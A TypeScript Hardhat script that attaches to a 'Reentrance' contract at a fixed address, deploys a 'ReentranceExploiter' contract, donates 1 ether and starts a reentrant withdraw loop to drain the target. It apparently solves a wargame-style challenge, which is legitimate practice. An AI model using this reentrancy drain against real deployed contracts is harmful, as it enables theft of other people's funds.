import "@nomiclabs/hardhat-waffle";
import {ethers} from "hardhat";
import utils from "web3-utils";
import hre from "hardhat";
import Web3 from "web3";
import { BigNumber } from "ethers";

async function main() {
    const GWEI = BigNumber.from("1000000000");
    const ETHER = GWEI.mul(GWEI);
    const [owner] = await ethers.getSigners();
    const instanceAddress = "0x9A44c10a3522157E308CcA5578a21DF456B2C109"

    console.log("Owner", owner.address);
    const provider = hre.ethers.getDefaultProvider(process.env.ALCHEMY_API);

    //Contract factories
    const Reentrance = await ethers.getContractFactory("Reentrance");
    const ReentranceExploiter = await ethers.getContractFactory("ReentranceExploiter");

    //Contracts
    const reentrance = await Reentrance.attach(instanceAddress);
    const reentranceExploiter = await ReentranceExploiter.deploy();
    console.log("Exploiter address: ", reentranceExploiter.address);

    //Send 1 ether to reentrance contract
    const tx = await reentrance.donate(reentranceExploiter.address, {value:ETHER});
    console.log("tx 1 complete");
    //Start the withdraw loop
    const tx2 = await reentranceExploiter.withdraw(ETHER);
    console.log("tx 2 complete");
  }
  
  main()
    .then(() => process.exit(0))
    .catch((error) => {
      console.error(error);
      process.exit(1);
    });
  